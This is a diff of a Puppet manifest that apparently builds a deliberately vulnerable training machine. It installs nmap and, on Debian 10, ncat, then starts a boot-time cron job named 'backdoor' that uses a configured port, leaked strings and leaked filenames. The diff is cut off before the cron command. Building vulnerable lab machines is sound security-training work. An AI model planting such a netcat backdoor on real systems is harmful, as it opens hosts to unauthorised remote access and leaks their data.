@@ -1,14 +1,16 @@
 class nc_backdoor::install {
-  package { 'nmap':
-    ensure => installed
-  }
-
   $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
   $port = $secgen_parameters['port'][0]
 
   $strings_to_leak = $secgen_parameters['strings_to_leak']
   $leaked_filenames = $secgen_parameters['leaked_filenames']
 
+  ensure_packages("nmap")
+  case $operatingsystemrelease {
+    /^(10).*/: { # do buster stuff
+      ensure_packages("ncat")
+    }
+  }
 
   # run on each boot via cron
   cron { 'backdoor':
